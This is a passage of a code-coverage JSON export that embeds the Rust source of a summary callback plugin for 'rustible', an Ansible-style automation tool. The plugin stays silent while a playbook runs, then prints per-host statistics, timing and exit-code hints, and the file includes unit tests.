},{"line":1016,"address":[25378924,25378841],"length":1,"stats":{"Line":2}},{"line":1018,"address":[25378953,25379030],"length":1,"stats":{"Line":2}},{"line":1020,"address":[25379128,25379074],"length":1,"stats":{"Line":2}},{"line":1021,"address":[25379271,25379169,25379216],"length":1,"stats":{"Line":2}},{"line":1022,"address":[25379383,25379667],"length":1,"stats":{"Line":2}},{"line":1023,"address":[25379392],"length":1,"stats":{"Line":1}},{"line":1024,"address":[25379424],"length":1,"stats":{"Line":1}},{"line":1027,"address":[25379564,25379491],"length":1,"stats":{"Line":2}},{"line":1028,"address":[25379579],"length":1,"stats":{"Line":1}},{"line":1029,"address":[25379626,25379887,25379872],"length":1,"stats":{"Line":3}},{"line":1030,"address":[25379645],"length":1,"stats":{"Line":1}},{"line":1036,"address":[23613755],"length":1,"stats":{"Line":4}},{"line":1037,"address":[25378090,25378007],"length":1,"stats":{"Line":2}},{"line":1039,"address":[25378130,25378224,25378184],"length":1,"stats":{"Line":3}},{"line":1041,"address":[25378720,25378732,25378197],"length":1,"stats":{"Line":3}},{"line":1043,"address":[25378264],"length":1,"stats":{"Line":1}},{"line":1044,"address":[25378327,25378381],"length":1,"stats":{"Line":1}},{"line":1046,"address":[25378622,25378488],"length":1,"stats":{"Line":2}},{"line":1047,"address":[25378609],"length":1,"stats":{"Line":1}},{"line":1048,"address":[25378616],"length":1,"stats":{"Line":1}},{"line":1052,"address":[25378361,25378632],"length":1,"stats":{"Line":2}},{"line":1055,"address":[23613901],"length":1,"stats":{"Line":4}},{"line":1056,"address":[25379965,25380039],"length":1,"stats":{"Line":2}},{"line":1057,"address":[25380138,25380068],"length":1,"stats":{"Line":2}},{"line":1060,"address":[23614014],"length":1,"stats":{"Line":5}},{"line":1062,"address":[25381149],"length":1,"stats":{"Line":1}},{"line":1064,"address":[25381247],"length":1,"stats":{"Line":1}},{"line":1067,"address":[25381316,25381520,25381379],"length":1,"stats":{"Line":3}},{"line":1070,"address":[25382604,25382592,25381423],"length":1,"stats":{"Line":3}},{"line":1071,"address":[25381468],"length":1,"stats":{"Line":1}},{"line":1073,"address":[25381543],"length":1,"stats":{"Line":1}},{"line":1075,"address":[25381584],"length":1,"stats":{"Line":1}},{"line":1080,"address":[25381637,25381699,25381721],"length":1,"stats":{"Line":2}},{"line":1081,"address":[25381706,25382112],"length":1,"stats":{"Line":1}},{"line":1082,"address":[25381769,25382117,25382105],"length":1,"stats":{"Line":0}},{"line":1083,"address":[25381873,25381749],"length":1,"stats":{"Line":1}},{"line":1084,"address":[25381807,25381866,25381875],"length":1,"stats":{"Line":0}},{"line":1085,"address":[25382069,25381841,25382026],"length":1,"stats":{"Line":3}},{"line":1086,"address":[25382062,25381983,25382074],"length":1,"stats":{"Line":2}},{"line":1088,"address":[25382019,25382031,25381952],"length":1,"stats":{"Line":2}},{"line":1092,"address":[25382159,25381909],"length":1,"stats":{"Line":2}},{"line":1093,"address":[25382207],"length":1,"stats":{"Line":1}},{"line":1096,"address":[25382242],"length":1,"stats":{"Line":1}},{"line":1097,"address":[25382297,25382330],"length":1,"stats":{"Line":2}},{"line":1101,"address":[25382382,25382309,25382509],"length":1,"stats":{"Line":3}},{"line":1102,"address":[25382511,25382458,25382505],"length":1,"stats":{"Line":2}},{"line":1106,"address":[23614195],"length":1,"stats":{"Line":0}},{"line":1110,"address":[23614072],"length":1,"stats":{"Line":0}}],"covered":262,"coverable":351},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","summary.rs"],"content":"//! Summary Callback Plugin for Rustible\n//!\n//! A silent-during-execution callback that only displays a final summary\n//! at the end of playbook execution. Designed for batch jobs, cron tasks,\n//! and scenarios where minimal output is required during runtime but a\n//! comprehensive summary is needed at completion.\n//!\n//! # Features\n//!\n//! - **Silent Execution**: No output during task execution\n//! - **Comprehensive Summary**: Displays aggregated stats at playbook end\n//! - **Exit Code Info**: Includes success/failure status with exit code guidance\n//! - **Timing Information**: Total execution duration and task counts\n//! - **Log File Compatible**: Designed to work alongside log file callbacks\n//! - **Host-Level Stats**: Per-host breakdown of ok/changed/failed/skipped/unreachable\n//!\n//! # Use Cases\n//!\n//! - Cron jobs where only final status matters\n//! - Batch processing with log file output\n//! - CI/CD pipelines with artifact-based logging\n//! - Scheduled automation tasks\n//! - Combining with `LogFileCallback` for detailed logs + summary\n//!\n//! # Example Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::summary::{SummaryCallback, SummaryConfig};\n//!\n//! // Basic usage with defaults\n//! let callback = SummaryCallback::new();\n//!\n//! // Custom configuration\n//! let callback = SummaryCallback::with_config(SummaryConfig {\n//!     show_host_details: true,\n//!     show_timing: true,\n//!     show_exit_code_hint: true,\n//!     compact_mode: false,\n//!     use_colors: true,\n//! });\n//!\n//! // Use with executor\n//! executor.with_callback(Box::new(callback));\n//!\n//! // Combine with log file callback\n//! let manager = CallbackManager::new();\n//! manager.register(Arc::new(SummaryCallback::new()));\n//! manager.register(Arc::new(LogFileCallback::new(\"/var/log/rustible.log\")));\n//! ```\n//!\n//! # Example Output\n//!\n//! ```text\n//! ================================================================================\n//! PLAYBOOK SUMMARY: deploy-production.yml\n//! ================================================================================\n//!\n//! Result: SUCCESS\n//! Duration: 2m 35.421s\n//! Total Tasks: 45\n//! Total Hosts: 5\n//!\n//! Host Statistics:\n//!   web01.example.com      ok=12  changed=3  failed=0  skipped=0  unreachable=0\n//!   web02.example.com      ok=12  changed=3  failed=0  skipped=0  unreachable=0\n//!   db01.example.com       ok=10  changed=2  failed=0  skipped=3  unreachable=0\n//!   db02.example.com       ok=10  changed=2  failed=0  skipped=3  unreachable=0\n//!   cache.example.com      ok=8   changed=1  failed=0  skipped=6  unreachable=0\n//!\n//! Totals: ok=52  changed=11  failed=0  skipped=12  unreachable=0\n//!\n//! Exit Code: 0 (success)\n//! ================================================================================\n//! ```\n//!\n//! # Exit Code Hints\n//!\n//! The callback provides exit code guidance:\n//! - `0` - All tasks completed successfully\n//! - `1` - One or more tasks failed\n//! - `2` - One or more hosts were unreachable\n//! - `3` - Both failures and unreachable hosts\n\nuse std::collections::HashMap;\nuse std::sync::Arc;\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse parking_lot::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\n/// Configuration options for the summary callback.\n#[derive(Debug, Clone)]\npub struct SummaryConfig {\n    /// Show per-host statistics in the summary\n    pub show_host_details: bool,\n    /// Show timing information (total duration)\n    pub show_timing: bool,\n    /// Show exit code hint at the end\n    pub show_exit_code_hint: bool,\n    /// Use compact single-line format instead of detailed\n    pub compact_mode: bool,\n    /// Use ANSI colors in output\n    pub use_colors: bool,\n    /// Minimum width for host name column\n    pub host_column_width: usize,\n    /// Show total aggregated stats\n    pub show_totals: bool,\n    /// Show task count\n    pub show_task_count: bool,\n}\n\nimpl Default for SummaryConfig {\n    fn default() -\u003e Self {\n        Self {\n            show_host_details: true,\n            show_timing: true,\n            show_exit_code_hint: true,\n            compact_mode: false,\n            use_colors: true,\n            host_column_width: 25,\n            show_totals: true,\n            show_task_count: true,\n        }\n    }\n}\n\nimpl SummaryConfig {\n    /// Creates a minimal configuration for truly compact output.\n    pub fn minimal() -\u003e Self {\n        Self {\n            show_host_details: false,\n            show_timing: true,\n            show_exit_code_hint: true,\n            compact_mode: true,\n            use_colors: true,\n            host_column_width: 20,\n            show_totals: true,\n            show_task_count: true,\n        }\n    }\n\n    /// Creates a configuration for machine-parseable output (no colors).\n    pub fn machine() -\u003e Self {\n        Self {\n            show_host_details: true,\n            show_timing: true,\n            show_exit_code_hint: true,\n            compact_mode: false,\n            use_colors: false,\n            host_column_width: 25,\n            show_totals: true,\n            show_task_count: true,\n        }\n    }\n}\n\n// ============================================================================\n// Host Statistics\n// ============================================================================\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of successful tasks (no changes)\n    ok: u32,\n    /// Count of tasks that made changes\n    changed: u32,\n    /// Count of failed tasks\n    failed: u32,\n    /// Count of skipped tasks\n    skipped: u32,\n    /// Count of unreachable attempts\n    unreachable: u32,\n}\n\nimpl HostStats {\n    /// Returns the total number of tasks executed for this host.\n    #[allow(dead_code)]\n    fn total_tasks(\u0026self) -\u003e u32 {\n        self.ok + self.changed + self.failed + self.skipped\n    }\n\n    /// Returns true if any failures occurred.\n    fn has_failures(\u0026self) -\u003e bool {\n        self.failed \u003e 0\n    }\n\n    /// Returns true if the host was unreachable.\n    fn is_unreachable(\u0026self) -\u003e bool {\n        self.unreachable \u003e 0\n    }\n}\n\n// ============================================================================\n// Aggregated Statistics\n// ============================================================================\n\n/// Aggregated statistics across all hosts.\n#[derive(Debug, Clone, Default)]\nstruct AggregateStats {\n    /// Total ok count\n    ok: u32,\n    /// Total changed count\n    changed: u32,\n    /// Total failed count\n    failed: u32,\n    /// Total skipped count\n    skipped: u32,\n    /// Total unreachable count\n    unreachable: u32,\n    /// Total number of hosts\n    host_count: usize,\n}\n\nimpl AggregateStats {\n    /// Compute aggregate stats from per-host stats.\n    fn from_host_stats(stats: \u0026HashMap\u003cString, HostStats\u003e) -\u003e Self {\n        let mut agg = Self {\n            host_count: stats.len(),\n            ..Default::default()\n        };\n\n        for host_stat in stats.values() {\n            agg.ok += host_stat.ok;\n            agg.changed += host_stat.changed;\n            agg.failed += host_stat.failed;\n            agg.skipped += host_stat.skipped;\n            agg.unreachable += host_stat.unreachable;\n        }\n\n        agg\n    }\n\n    /// Returns the suggested exit code based on stats.\n    fn suggested_exit_code(\u0026self) -\u003e i32 {\n        match (self.failed \u003e 0, self.unreachable \u003e 0) {\n            (true, true) =\u003e 3,   // Both failures and unreachable\n            (false, true) =\u003e 2,  // Unreachable only\n            (true, false) =\u003e 1,  // Failures only\n            (false, false) =\u003e 0, // All success\n        }\n    }\n\n    /// Returns the total task count.\n    fn total_tasks(\u0026self) -\u003e u32 {\n        self.ok + self.changed + self.failed + self.skipped\n    }\n}\n\n// ============================================================================\n// Internal State\n// ============================================================================\n\n/// Internal state for the summary callback.\n#[derive(Debug, Default)]\nstruct SummaryState {\n    /// Per-host statistics\n    host_stats: HashMap\u003cString, HostStats\u003e,\n    /// Playbook start time\n    start_time: Option\u003cInstant\u003e,\n    /// Current playbook name\n    playbook_name: Option\u003cString\u003e,\n    /// Playbook success status\n    playbook_success: bool,\n    /// Total number of plays\n    play_count: u32,\n    /// Current play name for context\n    current_play: Option\u003cString\u003e,\n}\n\nimpl SummaryState {\n    /// Resets the state for a new playbook run.\n    fn reset(\u0026mut self) {\n        self.host_stats.clear();\n        self.start_time = None;\n        self.playbook_name = None;\n        self.playbook_success = true;\n        self.play_count = 0;\n        self.current_play = None;\n    }\n}\n\n// ============================================================================\n// Summary Callback\n// ============================================================================\n\n/// A callback that shows nothing during execution and only displays a summary at the end.\n///\n/// This callback is designed for batch jobs and cron tasks where:\n/// - You don't need real-time feedback\n/// - You want minimal output during execution\n/// - You need a clear summary at completion\n/// - You're combining with a log file callback\n///\n/// # Thread Safety\n///\n/// This callback is thread-safe and can be used with parallel task execution.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::summary::SummaryCallback;\n///\n/// let callback = SummaryCallback::new();\n///\n/// // After playbook execution, the summary will be printed automatically\n/// // No output occurs during task execution\n/// ```\n#[derive(Debug)]\npub struct SummaryCallback {\n    /// Configuration options\n    config: SummaryConfig,\n    /// Internal state protected by RwLock\n    state: Arc\u003cRwLock\u003cSummaryState\u003e\u003e,\n}\n\nimpl SummaryCallback {\n    /// Creates a new summary callback with default configuration.\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self {\n            config: SummaryConfig::default(),\n            state: Arc::new(RwLock::new(SummaryState::default())),\n        }\n    }\n\n    /// Creates a summary callback with custom configuration.\n    #[must_use]\n    pub fn with_config(config: SummaryConfig) -\u003e Self {\n        Self {\n            config,\n            state: Arc::new(RwLock::new(SummaryState::default())),\n        }\n    }\n\n    /// Creates a minimal summary callback (compact output).\n    #[must_use]\n    pub fn minimal() -\u003e Self {\n        Self::with_config(SummaryConfig::minimal())\n    }\n\n    /// Creates a machine-readable summary callback (no colors).\n    #[must_use]\n    pub fn machine() -\u003e Self {\n        Self::with_config(SummaryConfig::machine())\n    }\n\n    /// Returns whether any failures occurred during execution.\n    pub fn has_failures(\u0026self) -\u003e bool {\n        let state = self.state.read();\n        state.host_stats.values().any(|s| s.has_failures())\n    }\n\n    /// Returns whether any hosts were unreachable.\n    pub fn has_unreachable(\u0026self) -\u003e bool {\n        let state = self.state.read();\n        state.host_stats.values().any(|s| s.is_unreachable())\n    }\n\n    /// Returns the suggested exit code based on execution results.\n    ///\n    /// - `0`: All tasks succeeded\n    /// - `1`: One or more tasks failed\n    /// - `2`: One or more hosts were unreachable\n    /// - `3`: Both failures and unreachable hosts\n    pub fn suggested_exit_code(\u0026self) -\u003e i32 {\n        let state = self.state.read();\n        let agg = AggregateStats::from_host_stats(\u0026state.host_stats);\n        agg.suggested_exit_code()\n    }\n\n    /// Returns the total execution duration.\n    pub fn duration(\u0026self) -\u003e Option\u003cDuration\u003e {\n        let state = self.state.read();\n        state.start_time.map(|start| start.elapsed())\n    }\n\n    /// Returns the aggregate statistics.\n    pub fn aggregate_stats(\u0026self) -\u003e (u32, u32, u32, u32, u32) {\n        let state = self.state.read();\n        let agg = AggregateStats::from_host_stats(\u0026state.host_stats);\n        (\n            agg.ok,\n            agg.changed,\n            agg.failed,\n            agg.skipped,\n            agg.unreachable,\n        )\n    }\n\n    // ========================================================================\n    // Formatting Helpers\n    // ========================================================================\n\n    /// Formats a duration in human-readable format.\n    fn format_duration(duration: Duration) -\u003e String {\n        let secs = duration.as_secs();\n        let millis = duration.subsec_millis();\n\n        if secs \u003e= 3600 {\n            let hours = secs / 3600;\n            let mins = (secs % 3600) / 60;\n            let remaining_secs = secs % 60;\n            format!(\"{}h {:02}m {:02}s\", hours, mins, remaining_secs)\n        } else if secs \u003e= 60 {\n            let mins = secs / 60;\n            let remaining_secs = secs % 60;\n            format!(\"{}m {:02}.{:03}s\", mins, remaining_secs, millis)\n        } else {\n            format!(\"{}.{:03}s\", secs, millis)\n        }\n    }\n\n    /// Prints the separator line.\n    fn print_separator(\u0026self) {\n        if self.config.use_colors {\n            println!(\"{}\", \"=\".repeat(80).bright_black());\n        } else {\n            println!(\"{}\", \"=\".repeat(80));\n        }\n    }\n\n    /// Prints the summary header.\n    fn print_header(\u0026self, playbook_name: \u0026str) {\n        self.print_separator();\n\n        if self.config.use_colors {\n            println!(\n                \"{}: {}\",\n                \"PLAYBOOK SUMMARY\".bright_white().bold(),\n                playbook_name.bright_cyan()\n            );\n        } else {\n            println!(\"PLAYBOOK SUMMARY: {}\", playbook_name);\n        }\n\n        self.print_separator();\n        println!();\n    }\n\n    /// Prints the result status line.\n    fn print_result(\u0026self, success: bool) {\n        let status = if success { \"SUCCESS\" } else { \"FAILED\" };\n\n        if self.config.use_colors {\n            let colored_status = if success {\n                status.green().bold()\n            } else {\n                status.red().bold()\n            };\n            println!(\"{}: {}\", \"Result\".bright_white(), colored_status);\n        } else {\n            println!(\"Result: {}\", status);\n        }\n    }\n\n    /// Prints timing information.\n    fn print_timing(\u0026self, duration: Duration) {\n        if !self.config.show_timing {\n            return;\n        }\n\n        let duration_str = Self::format_duration(duration);\n\n        if self.config.use_colors {\n            println!(\n                \"{}: {}\",\n                \"Duration\".bright_white(),\n                duration_str.bright_cyan()\n            );\n        } else {\n            println!(\"Duration: {}\", duration_str);\n        }\n    }\n\n    /// Prints task count information.\n    fn print_task_count(\u0026self, agg: \u0026AggregateStats) {\n        if !self.config.show_task_count {\n            return;\n        }\n\n        if self.config.use_colors {\n            println!(\n                \"{}: {}\",\n                \"Total Tasks\".bright_white(),\n                agg.total_tasks().to_string().bright_cyan()\n            );\n            println!(\n                \"{}: {}\",\n                \"Total Hosts\".bright_white(),\n                agg.host_count.to_string().bright_cyan()\n            );\n        } else {\n            println!(\"Total Tasks: {}\", agg.total_tasks());\n            println!(\"Total Hosts: {}\", agg.host_count);\n        }\n    }\n\n    /// Prints per-host statistics.\n    fn print_host_details(\u0026self, stats: \u0026HashMap\u003cString, HostStats\u003e) {\n        if !self.config.show_host_details || stats.is_empty() {\n            return;\n        }\n\n        println!();\n        if self.config.use_colors {\n            println!(\"{}:\", \"Host Statistics\".yellow().bold());\n        } else {\n            println!(\"Host Statistics:\");\n        }\n\n        // Calculate max host name width\n        let max_width = stats\n            .keys()\n            .map(|h| h.len())\n            .max()\n            .unwrap_or(0)\n            .max(self.config.host_column_width);\n\n        // Sort hosts for consistent output\n        let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n        hosts.sort();\n\n        for host in hosts {\n            if let Some(host_stats) = stats.get(host) {\n                self.print_host_line(host, host_stats, max_width);\n            }\n        }\n    }\n\n    /// Prints a single host's statistics line.\n    fn print_host_line(\u0026self, host: \u0026str, stats: \u0026HostStats, width: usize) {\n        if self.config.use_colors {\n            // Color the host name based on status\n            let host_colored = if stats.has_failures() || stats.is_unreachable() {\n                format!(\"{:width$}\", host, width = width).red()\n            } else if stats.changed \u003e 0 {\n                format!(\"{:width$}\", host, width = width).yellow()\n            } else {\n                format!(\"{:width$}\", host, width = width).green()\n            };\n\n            println!(\n                \"  {}  ok={}  changed={}  failed={}  skipped={}  unreachable={}\",\n                host_colored,\n                stats.ok.to_string().green(),\n                stats.changed.to_string().yellow(),\n                if stats.failed \u003e 0 {\n                    stats.failed.to_string().red().bold().to_string()\n                } else {\n                    stats.failed.to_string()\n                },\n                stats.skipped.to_string().cyan(),\n                if stats.unreachable \u003e 0 {\n                    stats.unreachable.to_string().magenta().bold().to_string()\n                } else {\n                    stats.unreachable.to_string()\n                },\n            );\n        } else {\n            println!(\n                \"  {:width$}  ok={}  changed={}  failed={}  skipped={}  unreachable={}\",\n                host,\n                stats.ok,\n                stats.changed,\n                stats.failed,\n                stats.skipped,\n                stats.unreachable,\n                width = width\n            );\n        }\n    }\n\n    /// Prints the aggregate totals.\n    fn print_totals(\u0026self, agg: \u0026AggregateStats) {\n        if !self.config.show_totals {\n            return;\n        }\n\n        println!();\n        if self.config.use_colors {\n            println!(\n                \"{}: ok={}  changed={}  failed={}  skipped={}  unreachable={}\",\n                \"Totals\".bright_white().bold(),\n                agg.ok.to_string().green(),\n                agg.changed.to_string().yellow(),\n                if agg.failed \u003e 0 {\n                    agg.failed.to_string().red().bold().to_string()\n                } else {\n                    agg.failed.to_string()\n                },\n                agg.skipped.to_string().cyan(),\n                if agg.unreachable \u003e 0 {\n                    agg.unreachable.to_string().magenta().bold().to_string()\n                } else {\n                    agg.unreachable.to_string()\n                },\n            );\n        } else {\n            println!(\n                \"Totals: ok={}  changed={}  failed={}  skipped={}  unreachable={}\",\n                agg.ok, agg.changed, agg.failed, agg.skipped, agg.unreachable\n            );\n        }\n    }\n\n    /// Prints the exit code hint.\n    fn print_exit_code_hint(\u0026self, agg: \u0026AggregateStats) {\n        if !self.config.show_exit_code_hint {\n            return;\n        }\n\n        println!();\n\n        let exit_code = agg.suggested_exit_code();\n        let description = match exit_code {\n            0 =\u003e \"success\",\n            1 =\u003e \"task failures\",\n            2 =\u003e \"unreachable hosts\",\n            3 =\u003e \"failures and unreachable\",\n            _ =\u003e \"unknown\",\n        };\n\n        if self.config.use_colors {\n            let code_colored = if exit_code == 0 {\n                exit_code.to_string().green().bold()\n            } else {\n                exit_code.to_string().red().bold()\n            };\n\n            println!(\n                \"{}: {} ({})\",\n                \"Exit Code\".bright_white(),\n                code_colored,\n                description\n            );\n        } else {\n            println!(\"Exit Code: {} ({})\", exit_code, description);\n        }\n    }\n\n    /// Prints the compact summary format.\n    fn print_compact_summary(\n        \u0026self,\n        playbook_name: \u0026str,\n        success: bool,\n        duration: Option\u003cDuration\u003e,\n    ) {\n        let state = self.state.read();\n        let agg = AggregateStats::from_host_stats(\u0026state.host_stats);\n\n        let status = if success { \"OK\" } else { \"FAILED\" };\n        let duration_str = duration.map(Self::format_duration).unwrap_or_default();\n        let exit_code = agg.suggested_exit_code();\n\n        if self.config.use_colors {\n            let status_colored = if success {\n                status.green().bold()\n            } else {\n                status.red().bold()\n            };\n\n            println!(\n                \"[{}] {} | {} | ok={} changed={} failed={} skipped={} unreachable={} | exit={}\",\n                status_colored,\n                playbook_name.bright_cyan(),\n                duration_str.bright_white(),\n                agg.ok.to_string().green(),\n                agg.changed.to_string().yellow(),\n                if agg.failed \u003e 0 {\n                    agg.failed.to_string().red().bold().to_string()\n                } else {\n                    agg.failed.to_string()\n                },\n                agg.skipped.to_string().cyan(),\n                if agg.unreachable \u003e 0 {\n                    agg.unreachable.to_string().magenta().bold().to_string()\n                } else {\n                    agg.unreachable.to_string()\n                },\n                if exit_code == 0 {\n                    exit_code.to_string().green().to_string()\n                } else {\n                    exit_code.to_string().red().bold().to_string()\n                }\n            );\n        } else {\n            println!(\n                \"[{}] {} | {} | ok={} changed={} failed={} skipped={} unreachable={} | exit={}\",\n                status,\n                playbook_name,\n                duration_str,\n                agg.ok,\n                agg.changed,\n                agg.failed,\n                agg.skipped,\n                agg.unreachable,\n                exit_code\n            );\n        }\n    }\n\n    /// Prints the full detailed summary.\n    fn print_detailed_summary(\n        \u0026self,\n        playbook_name: \u0026str,\n        success: bool,\n        duration: Option\u003cDuration\u003e,\n    ) {\n        let state = self.state.read();\n        let agg = AggregateStats::from_host_stats(\u0026state.host_stats);\n\n        self.print_header(playbook_name);\n        self.print_result(success);\n\n        if let Some(dur) = duration {\n            self.print_timing(dur);\n        }\n\n        self.print_task_count(\u0026agg);\n        self.print_host_details(\u0026state.host_stats);\n        self.print_totals(\u0026agg);\n        self.print_exit_code_hint(\u0026agg);\n\n        self.print_separator();\n    }\n\n    /// Prints the summary (called at playbook end).\n    fn print_summary(\u0026self) {\n        let (playbook_name, success, duration) = {\n            let state = self.state.read();\n            (\n                state\n                    .playbook_name\n                    .clone()\n                    .unwrap_or_else(|| \"unknown\".to_string()),\n                state.playbook_success,\n                state.start_time.map(|s| s.elapsed()),\n            )\n        };\n\n        if self.config.compact_mode {\n            self.print_compact_summary(\u0026playbook_name, success, duration);\n        } else {\n            self.print_detailed_summary(\u0026playbook_name, success, duration);\n        }\n    }\n}\n\nimpl Default for SummaryCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for SummaryCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            state: Arc::clone(\u0026self.state),\n        }\n    }\n}\n\n// ============================================================================\n// ExecutionCallback Implementation\n// ============================================================================\n\n#[async_trait]\nimpl ExecutionCallback for SummaryCallback {\n    /// Called when a playbook starts - records start time silently.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let mut state = self.state.write();\n        state.reset();\n        state.start_time = Some(Instant::now());\n        state.playbook_name = Some(name.to_string());\n        state.playbook_success = true;\n        // No output - silent during execution\n    }\n\n    /// Called when a playbook ends - prints the summary.\n    async fn on_playbook_end(\u0026self, _name: \u0026str, success: bool) {\n        {\n            let mut state = self.state.write();\n            state.playbook_success = success;\n        }\n\n        // This is the only place we produce output\n        self.print_summary();\n    }\n\n    /// Called when a play starts - silently tracks play count.\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        let mut state = self.state.write();\n        state.play_count += 1;\n        state.current_play = Some(name.to_string());\n\n        // Initialize host stats for all hosts in this play\n        for host in hosts {\n            state.host_stats.entry(host.clone()).or_default();\n        }\n        // No output - silent during execution\n    }\n\n    /// Called when a play ends - silent.\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // No output - silent during execution\n    }\n\n    /// Called when a task starts - silent.\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        // No output - silent during execution\n    }\n\n    /// Called when a task completes - silently updates statistics.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let mut state = self.state.write();\n        let host_stats = state.host_stats.entry(result.host.clone()).or_default();\n\n        // Update statistics based on result\n        if result.result.skipped {\n            host_stats.skipped += 1;\n        } else if !result.result.success {\n            host_stats.failed += 1;\n            state.playbook_success = false;\n        } else if result.result.changed {\n            host_stats.changed += 1;\n        } else {\n            host_stats.ok += 1;\n        }\n        // No output - silent during execution\n    }\n\n    /// Called when a handler is triggered - silent.\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // No output - silent during execution\n    }\n\n    /// Called when facts are gathered - silent.\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // No output - silent during execution\n    }\n}\n\n// ============================================================================\n// Unreachable Host Extension\n// ============================================================================\n\n/// Trait extension for handling unreachable hosts in summary callback.\n#[async_trait]\npub trait SummaryUnreachableCallback: ExecutionCallback {\n    /// Called when a host becomes unreachable.\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str);\n}\n\n#[async_trait]\nimpl SummaryUnreachableCallback for SummaryCallback {\n    async fn on_host_unreachable(\u0026self, host: \u0026str, _task_name: \u0026str, _error: \u0026str) {\n        let mut state = self.state.write();\n        let host_stats = state.host_stats.entry(host.to_string()).or_default();\n        host_stats.unreachable += 1;\n        state.playbook_success = false;\n        // No output - silent during execution\n    }\n}\n\n// ============================================================================\n// Builder Pattern\n// ============================================================================\n\n/// Builder for creating `SummaryCallback` with custom configuration.\n#[derive(Debug, Default)]\npub struct SummaryCallbackBuilder {\n    config: SummaryConfig,\n}\n\nimpl SummaryCallbackBuilder {\n    /// Create a new builder with default configuration.\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set whether to show per-host details.\n    pub fn show_host_details(mut self, show: bool) -\u003e Self {\n        self.config.show_host_details = show;\n        self\n    }\n\n    /// Set whether to show timing information.\n    pub fn show_timing(mut self, show: bool) -\u003e Self {\n        self.config.show_timing = show;\n        self\n    }\n\n    /// Set whether to show exit code hint.\n    pub fn show_exit_code_hint(mut self, show: bool) -\u003e Self {\n        self.config.show_exit_code_hint = show;\n        self\n    }\n\n    /// Set whether to use compact mode.\n    pub fn compact_mode(mut self, compact: bool) -\u003e Self {\n        self.config.compact_mode = compact;\n        self\n    }\n\n    /// Set whether to use colors.\n    pub fn use_colors(mut self, use_colors: bool) -\u003e Self {\n        self.config.use_colors = use_colors;\n        self\n    }\n\n    /// Set the host column width.\n    pub fn host_column_width(mut self, width: usize) -\u003e Self {\n        self.config.host_column_width = width;\n        self\n    }\n\n    /// Set whether to show totals.\n    pub fn show_totals(mut self, show: bool) -\u003e Self {\n        self.config.show_totals = show;\n        self\n    }\n\n    /// Set whether to show task count.\n    pub fn show_task_count(mut self, show: bool) -\u003e Self {\n        self.config.show_task_count = show;\n        self\n    }\n\n    /// Build the `SummaryCallback`.\n    pub fn build(self) -\u003e SummaryCallback {\n        SummaryCallback::with_config(self.config)\n    }\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[tokio::test]\n    async fn test_summary_callback_tracks_stats() {\n        let callback = SummaryCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Simulate task completions\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        let failed_result =\n            create_execution_result(\"host2\", \"task1\", false, false, false, \"failed\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        let skipped_result =\n            create_execution_result(\"host2\", \"task2\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        // Verify stats\n        let (ok, changed, failed, skipped, unreachable) = callback.aggregate_stats();\n        assert_eq!(ok, 1);\n        assert_eq!(changed, 1);\n        assert_eq!(failed, 1);\n        assert_eq!(skipped, 1);\n        assert_eq!(unreachable, 0);\n\n        assert!(callback.has_failures());\n        assert!(!callback.has_unreachable());\n        assert_eq!(callback.suggested_exit_code(), 1);\n    }\n\n    #[tokio::test]\n    async fn test_summary_callback_no_failures() {\n        let callback = SummaryCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        assert!(!callback.has_failures());\n        assert_eq!(callback.suggested_exit_code(), 0);\n    }\n\n    #[tokio::test]\n    async fn test_summary_callback_unreachable() {\n        let callback = SummaryCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback\n            .on_host_unreachable(\"host1\", \"gather_facts\", \"Connection refused\")\n            .await;\n\n        assert!(callback.has_unreachable());\n        